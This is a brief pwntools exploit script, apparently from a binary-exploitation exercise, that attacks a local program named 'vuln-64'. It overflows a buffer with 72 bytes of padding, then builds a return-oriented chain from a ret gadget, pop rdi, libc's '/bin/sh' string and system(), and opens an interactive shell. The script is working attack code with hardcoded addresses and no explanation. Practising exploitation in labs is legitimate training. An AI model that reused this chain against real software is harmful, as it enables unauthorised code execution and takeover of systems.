from pwn import *

io = process('./vuln-64')

libc_base = 0x00007ffff7db0000
ret = 0x0000000000401016		# Why need a ret gadget after padding: https://ropemporium.com/guide.html#Common%20pitfalls
pop_rdi = 0x00000000004011cb
system = libc_base + 0x0000000000528f0
binsh = libc_base + 0x1a7e43

payload = b'A' * 72
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

io.sendline(payload)
io.interactive()